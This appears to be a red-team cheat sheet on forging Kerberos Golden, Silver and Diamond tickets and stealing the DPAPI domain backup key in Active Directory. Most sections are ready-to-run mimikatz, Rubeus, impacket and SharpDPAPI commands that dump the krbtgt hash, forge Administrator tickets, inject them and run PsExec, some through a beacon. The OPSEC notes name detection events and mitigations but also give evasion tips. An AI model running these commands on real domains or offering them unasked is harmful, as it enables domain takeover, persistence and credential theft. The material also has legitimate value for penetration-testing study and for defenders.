# Golden Ticket

- The Golden Ticket attack enables attackers to forge and sign TGTs using the krbtgt account's password hash. 
- When these tickets get presented to an AD server, the information within them will not be checked at all and will be considered valid due to being signed with `krbtgt` account's password hash.

```powershell
# Getting domain SID
Import-Module .\PowerView.ps1
Get-DomainSID

# Getting krbtgt hash using dcsync attack
mimikatz # lsadump::dcsync /user:krbtgt /domain:$DOMAIN

# Forging golden ticket
mimikatz # kerberos::golden /domain:$DOMAIN /user:Administrator /sid:$DOMAIN_SID /rc4:$KRBTGT_HASH /ptt
.\Rubeus.exe golden /aes256:$KRBTGT_HASH /user:Administrator /domain:$DOMAIN /sid:$DOMAIN_SID /nowrap
```

```shell
# Get domain SID
impacket-lookupsid $DOMAIN/$USER@$DC_FQDN -domain-sids

# Forging golden ticket
impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN Administrator
```

### OPSEC Considerations

- In a normal ticket exchange, service tickets must be obtained via a TGS-REQ using a valid TGT.
- This TGT is also usually requested by the user in an AS-REQ and returned by the KDC in an AS-REP.
- These AS-REQs are logged by domain controllers as event ID `4768`. If defenders spot TGS-REQs (or 4769 events) without any prior 4768 event for the user, this may be an indicator that the TGT was forged offline.
- Anomalous ticket data can also give golden tickets away. One egregious example is the lifetime data that Mimikatz includes by default. Most Kerberos domain policies have the maximum lifetime of a ticket set to 10 hours and the maximum lifetime for ticket renewal to 7 days.
- That effectively means you can renew a ticket every 10 hours up to a maximum age of 7 days.  However, Mimikatz sets the lifetime of its forged tickets to 10 years.
- Other detection parameters can be the account DOMAIN field is blank and the account DOMAIN field contains DOMAIN FQDN instead of just domain.
- Once a golden ticket is detected, the krbtgt account password must be changed `twice` to remove the persistence, as the current and previous passwords are stored in the domain. 
- The password of the krbtgt account should be changed regularly, as it is an admin account.



# Silver Tickets

- Every machine account has an NTLM hash, this is the hash of the computer, represented as the SYSTEM$ account.
- This is the PSK (Pre-Shared Key) between the Domain and Workstation which is used to sign TGS (Ticket Granting Service) Kerberos tickets.

- The attacker can forge a service ticket from scratch since they can create an arbitrary PAC and encrypt it with the secret stolen. \
- Once this TGS ticket is forged, the attacker presents it to the service.
- The service can decrypt it because it has been encrypted with its own password, and then it will read the contents of the PAC.
- As the attacker has forged it, they can embed whatever information they desire, such as being a domain administrator. This forged ticket is called a Silver Ticket.

- To forge a Silver Ticket, an attacker requires:
    - NTLM password's hash or keys for a service or machine account
    - SID of the domain
    - A target host, a service name (its SPN), an arbitrary username, and group information.

> Silver tickets can be created for any existing or non-existing user account.


```shell
# /service is the target service.
# /aes256 is the AES256 hash of the target computer account.
# /user is the username to impersonate.
# /domain is the FQDN of the computer's domain.
# /sid is the domain SID.
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/host /aes256: /user:Administrator /domain: /sid: /nowrap

# Using mimikatz
mimikatz # kerberos::golden /domain:$DOMAIN /user:Administrator /sid:$DOMAIN_SID /rc4:$SERVICE_HASH /target:$TARGET_HOST /service:cifs  /ptt

# Save ticket and inject in sacrificial session
mimikatz.exe "kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.inlanefreight.local /service:cifs /ticket:sql01.kirbi" exit

Rubeus.exe createnetonly /program:cmd.exe /show

Rubeus.exe ptt /ticket:sql01.kirbi

PSExec.exe -accepteula \\sql01.inlanefreight.local cmd
```

- Consider a scenario where you obtain the plaintext password of a domain account running an MSSQL service. 
- That service account may not have sysadmin privileges on the database instance (which is default), so the service account is not directly useful in gaining access to the underlying database.
- However, you can use the service's secret to forge a service ticket for the MSSQL service, impersonating a user you know to be a sysadmin.

```shell
# Convert plaintext password into hash
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /user:mssql_svc /domain:CONTOSO.COM /password:Passw0rd!

# Create silver ticket
# /id is the RID for $USER.
# /groups are the RIDs of $USER's group membership.  513 is 'Domain Users', 1106 is 'Workstation Admins', 1107 is 'Server Admins', and 4602 is 'Database Admins'.
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:MSSQLSvc/lon-db-1.contoso.com:1433 /rc4:FC525C9683E8FE067095BA2DDC971889 /user:$USER /id:$USER_ID /groups:513,1106,1107,4602 /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```

```shell
impacket-ticketer -nthash  -domain-sid  -domain  -spn cifs/sql01.inlanefreight.local Administrator
```

### OPSEC Considerations

- Silver tickets can be effectively mitigated when `PAC validation is enabled` on computers. In the examples above, Rubeus will use the computer's secret to sign the ticket where it should be signed with the krbtgt's secret.  Obviously, this isn't possible if you don't possess it.  So when the target computer receives the silver ticket, it will validate the checksum signature with the KDC which will fail, and the service will deny you access.
- In cases where PAC validation cannot be enabled or the adversary has signed the ticket using the krbtgt hash, silver tickets may still be possible to detect.
- Since silver tickets are forged offline, their use produces a `4624` event on the target computer, but there would be no corresponding `4769` event prior to that.
- Silver tickets may also be detected if they're forged with inaccurate or anomalous information.  For example, the Kerberos realm (i.e. the domain name) should traditionally be in all uppercase characters.  If a ticket is logged that has the domain in lowercase, then it could be an indication that it's forged.  Some tools, such as Rubeus, make an effort to convert provided the domain to uppercase to avoid this particular anomaly but your mileage will vary between tools.

# Diamond Tickets (OPSEC Safe IMO)

- A diamond ticket is created by requesting a legitimate TGT for a user.
- The KDC's secret is then used to decrypt the ticket where the internal information, such as the principal's name, ID, groups, etc, can be changed.
- The ticket is then re-encrypted and re-signed with the KDC's secret.

The advantage of this technique is that all the peripheral information in the ticket is perfectly in-line with the domain's policy.  Another is that it makes it more difficult to detected based on missing AS-REQs.

```shell
# /tgtdeleg uses the TGT delegation trick to obtain a usable TGT for the current user without needing credentials.
# /krbkey is the krbtgt's AES256 hash.
# /ticketuser is the user we want to impersonate.
# /ticketuserid is the impersonated user's RID.
# /domain is the current domain.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey: /ticketuser:Administrator /ticketuserid:500 /domain:$DOMAIN /nowrap
```


# DPAPI Backup Key

```shell
# Fetch domain backup key
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey

# Get user's DPAPI creds
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:$DOMAIN_MASTER_KEY
```